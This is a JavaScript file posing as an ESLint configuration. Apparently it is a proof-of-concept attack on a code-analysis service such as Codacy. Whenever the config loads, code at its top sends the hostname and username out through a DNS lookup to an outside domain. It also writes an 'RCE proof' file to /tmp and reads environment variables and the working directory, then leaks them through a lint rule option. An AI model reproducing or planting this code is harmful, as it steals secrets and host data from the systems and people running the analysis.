var dns = require('dns');
var os = require('os');
var fs = require('fs');

// DNS exfil attempt
var data = os.hostname() + '-' + os.userInfo().username;
dns.resolve(data + '.r.ssrftest123.xyz', function(){});

// Write evidence file
try {
  fs.writeFileSync('/tmp/codacy-rce-proof.txt', 'RCE:' + os.hostname() + ':' + process.cwd() + ':' + JSON.stringify(os.userInfo()));
} catch(e) {}

// Also try to read sensitive files and embed in ESLint output
var info = '';
try { info += 'ENV:' + JSON.stringify(process.env).substring(0,500); } catch(e) {}
try { info += '|CWD:' + process.cwd(); } catch(e) {}

// Force an ESLint error that contains our exfiltrated data
module.exports = {
  rules: {},
  overrides: [{
    files: ['**/*.js'],
    rules: { 'no-unused-vars': ['error', { varsIgnorePattern: info }] }
  }]
};
